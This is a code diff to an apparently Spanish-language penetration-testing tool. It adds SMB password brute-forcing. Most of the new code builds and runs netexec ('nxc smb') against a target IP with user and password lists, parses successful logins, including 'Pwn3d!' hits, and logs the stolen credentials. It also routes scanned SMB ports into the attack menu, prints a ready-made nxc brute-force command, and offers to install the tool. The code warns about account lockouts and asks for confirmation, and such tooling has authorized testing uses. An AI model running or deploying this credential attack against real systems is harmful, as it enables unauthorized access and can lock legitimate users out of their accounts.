@@ -322,6 +322,17 @@ def ejecutar_hydra(
     finally:
         _limpiar_hydra_restore()
 
+    # Diagnóstico específico de SMB: hydra suele fallar contra SMBv2/3 con firma.
+    if servicio == "smb" and any(
+        clave in salida.lower()
+        for clave in ("invalid reply from target", "could not connect", "smb does not like")
+    ):
+        msg_aviso("El módulo SMB de Hydra no pudo negociar con el objetivo.")
+        msg_nota("Causa típica: SMBv2/3 con firma obligatoria o diálogo no compatible con Hydra.")
+        msg_nota("Herramienta recomendada para SMB: netexec (nxc).")
+        msg_nota(f"  nxc smb {ip} -u usuarios.txt -p {Path(diccionario_passwords).name}")
+        msg_nota("Ojo: la fuerza bruta SMB puede BLOQUEAR cuentas por intentos fallidos.")
+
     hallazgos = _extraer_credenciales_hydra(salida)
     datos_ip = _cargar_json(CARPETA_ESCANEO / f"{ip}.json", {})
     so_disp = datos_ip.get("so_dispositivo", "No detectado")
@@ -351,6 +362,104 @@ def ejecutar_hydra(
     return hallazgos
 
 
+# ---------------------------------------------------------------------------
+# SMB con netexec (nxc): Hydra no habla SMBv2/3 moderno, netexec sí.
+# ---------------------------------------------------------------------------
+_ANSI_RE = re.compile(r"\x1b\[[0-9;]*m")
+
+
+def _asegurar_netexec() -> str | None:
+    """Devuelve el binario de netexec disponible; si falta, ofrece instalarlo."""
+    for binario in ("nxc", "netexec", "crackmapexec", "cme"):
+        if shutil.which(binario):
+            return binario
+
+    msg_aviso("netexec (nxc) no está instalado: es la herramienta correcta para SMB.")
+    if _asegurar_herramienta("nxc", "netexec"):
+        return "nxc"
+    msg_nota("Alternativa manual: pipx install netexec")
+    return None
+
+
+def _extraer_credenciales_netexec(salida: str) -> list[tuple[str, str]]:
+    """Extrae usuario/contraseña de las líneas de éxito [+] DOMINIO\\user:pass."""
+    hallazgos: list[tuple[str, str]] = []
+    for linea in salida.splitlines():
+        limpia = _ANSI_RE.sub("", linea)
+        if "[+]" not in limpia:
+            continue
+        m = re.search(r"\[\+\]\s+(?:([^\\\s]*)\\)?([^:\s]+):(\S+)", limpia)
+        if m:
+            usuario = m.group(2).strip()
+            password = re.sub(r"\s*\(Pwn3d!\).*$", "", m.group(3)).strip()
+            if usuario and (usuario, password) not in hallazgos:
+                hallazgos.append((usuario, password))
+    return hallazgos
+
+
+def ejecutar_netexec_smb(
+    ip: str,
+    diccionario_passwords: str,
+    usuario: str | None = None,
+    lista_usuarios: str | None = None,
+) -> list[tuple[str, str]]:
+    binario = _asegurar_netexec()
+    if not binario:
+        pausar()
+        return []
+
+    objetivo_user = usuario or lista_usuarios
+    if not objetivo_user:
+        msg_aviso("Debes indicar un usuario o una lista de usuarios.")
+        pausar()
+        return []
+
+    msg_aviso("La fuerza bruta SMB puede BLOQUEAR cuentas tras varios intentos fallidos.")
+    cont = input(verde("¿Continuar con el ataque SMB (netexec)? [s/N]: ")).strip().lower()
+    if cont not in ("s", "si", "sí", "y", "yes"):
+        msg_nota("Ataque SMB cancelado.")
+        pausar()
+        return []
+
+    # netexec detecta solo si -u / -p es un fichero existente o un literal
+    cmd = [binario, "smb", ip, "-u", objetivo_user, "-p", diccionario_passwords]
+    msg_info(f"Lanzando {binario} (SMB) contra {ip}:445...")
+    print("-" * 62)
+
+    res = ejecutar_con_spinner(cmd, texto="Probando credenciales SMB (netexec)", timeout=1800)
+    salida = (res.stdout or "") + (res.stderr or "")
+    print(salida)
+
+    hallazgos = _extraer_credenciales_netexec(salida)
+    datos_ip = _cargar_json(CARPETA_ESCANEO / f"{ip}.json", {})
+    so_disp = datos_ip.get("so_dispositivo", "No detectado")
+
+    for u, p in hallazgos:
+        msg_ok(f"Acceso SMB válido en {ip} -> usuario: '{u}' | contraseña: '{p}'")
+        registrar_acceso_exitoso(ip, "smb", 445, u, p, so_disp)
+
+    if not hallazgos:
+        msg_aviso("No se encontraron credenciales SMB válidas (o el objetivo rechazó la conexión).")
+    pausar()
+    return hallazgos
+
+
+def _lanzar_servicio(
+    ip: str,
+    srv: str,
+    pt: int,
+    dic: str,
+    usuario: str | None,
+    lista_usuarios: str | None,
+    opcion: str | None,
+) -> None:
+    """Enruta cada servicio a su herramienta: SMB -> netexec, resto -> hydra."""
+    if srv == "smb":
+        ejecutar_netexec_smb(ip, dic, usuario=usuario, lista_usuarios=lista_usuarios)
+    else:
+        ejecutar_hydra(ip, srv, pt, dic, usuario=usuario, lista_usuarios=lista_usuarios, opcion_modulo=opcion)
+
+
 def menu_ataque(objetivo_actual: str | None = None, diccionario_actual: str | None = None) -> str | None:
     while True:
         limpiar()
@@ -375,11 +484,21 @@ def menu_ataque(objetivo_actual: str | None = None, diccionario_actual: str | No
         datos_ip = _cargar_json(CARPETA_ESCANEO / f"{ip}.json", {})
         puertos_detectados = datos_ip.get("puertos", [])
         objetivos_ataque = []
+        vistos = set()
 
         for p in puertos_detectados:
-            srv = _normalizar_servicio(p.get("servicio", ""), int(p.get("puerto", 0)))
-            if srv in SERVICIOS_SOPORTADOS:
-                objetivos_ataque.append((srv, int(p["puerto"])))
+            puerto_p = int(p.get("puerto", 0))
+            srv = _normalizar_servicio(p.get("servicio", ""), puerto_p)
+            if srv not in SERVICIOS_SOPORTADOS:
+                continue
+            # Hydra habla SMB directo por el 445, no por NetBIOS (139): forzamos 445
+            if srv == "smb":
+                puerto_p = 445
+            clave = (srv, puerto_p)
+            if clave in vistos:
+                continue
+            vistos.add(clave)
+            objetivos_ataque.append((srv, puerto_p))
 
         txt_auto = (
             f"Automático según escaneo previo ({', '.join(f'{s}:{pt}' for s, pt in objetivos_ataque)})"
@@ -421,7 +540,7 @@ def menu_ataque(objetivo_actual: str | None = None, diccionario_actual: str | No
         if op == "1" and objetivos_ataque:
             for srv, pt in objetivos_ataque:
                 opcion = _opcion_modulo_para(srv, interactivo=False)
-                ejecutar_hydra(ip, srv, pt, dic, usuario=usuario, lista_usuarios=lista_usuarios, opcion_modulo=opcion)
+                _lanzar_servicio(ip, srv, pt, dic, usuario, lista_usuarios, opcion)
         else:
             if op == "1" and not objetivos_ataque:
                 msg_nota("No había puertos guardados del escaneo; indícalo aquí:")
@@ -438,6 +557,6 @@ def menu_ataque(objetivo_actual: str | None = None, diccionario_actual: str | No
                 pausar()
                 return ip
             opcion = _opcion_modulo_para(srv, interactivo=True)
-            ejecutar_hydra(ip, srv, puerto, dic, usuario=usuario, lista_usuarios=lista_usuarios, opcion_modulo=opcion)
+            _lanzar_servicio(ip, srv, puerto, dic, usuario, lista_usuarios, opcion)
 
         return ip
